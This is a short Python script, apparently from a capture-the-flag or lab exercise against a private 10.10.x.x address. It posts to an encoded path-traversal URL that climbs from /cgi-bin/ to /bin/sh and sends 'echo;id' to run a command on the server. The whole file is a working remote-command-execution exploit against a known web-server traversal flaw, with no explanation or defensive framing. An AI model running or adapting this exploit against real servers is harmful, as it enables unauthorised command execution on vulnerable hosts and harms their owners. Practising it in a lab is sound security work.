import requests

r = requests.post("http://10.10.203.112/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh", data="echo;id")

print(r.text)

